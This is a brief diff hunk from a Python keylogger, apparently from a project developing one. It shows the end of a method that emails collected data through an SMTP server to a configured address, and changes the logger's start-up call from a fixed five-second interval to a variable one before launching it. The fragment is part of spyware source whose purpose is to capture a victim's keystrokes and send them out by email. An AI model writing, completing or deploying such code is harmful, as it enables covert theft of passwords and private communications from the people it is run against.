@@ -57,6 +57,6 @@ class Keylogger:
         server.sendmail(email, email, new_message)
         server.quit()
 
-keylogger = Keylogger(5,email,password)
+keylogger = Keylogger(interval,email,password)
 keylogger.start()
 
